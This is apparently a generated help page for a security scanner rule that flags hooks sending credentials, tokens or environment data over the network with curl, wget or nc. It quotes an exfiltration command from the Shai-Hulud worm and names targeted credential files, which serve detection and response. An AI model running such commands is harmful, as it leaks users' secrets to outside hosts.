# credential-exfiltration

Severity **high**, pack core 3.

A credential file, a token or the whole environment sent over the network

## What it means

A hook sends a credential over the network: the environment, a token a tool
prints such as gh auth token, a credential file such as ~/.aws/credentials or
~/.npmrc, or what a cloud metadata service answers, piped, redirected, uploaded
or substituted into what curl, wget or nc sends. The Shai-Hulud worm
(StepSecurity, 15 September 2025) sent a workflow's secrets with curl -d
"$CONTENTS" https://webhook.site/..., and the compromised nx packages
(StepSecurity, 27 August 2025) ran gh auth token and read ~/.npmrc before
uploading what they found.

## What to do

Remove the command unless sending that credential is what the hook is for. A
token meant for a service belongs in the header or user that service
authenticates, sent to that service alone. If the hook came from someone else,
rotate every credential it could reach.

---

Generated from the rule pack by `./scripts/rule-pages.sh`. Edit the rule
in `crates/domain/src/explain.rs`, not this page.
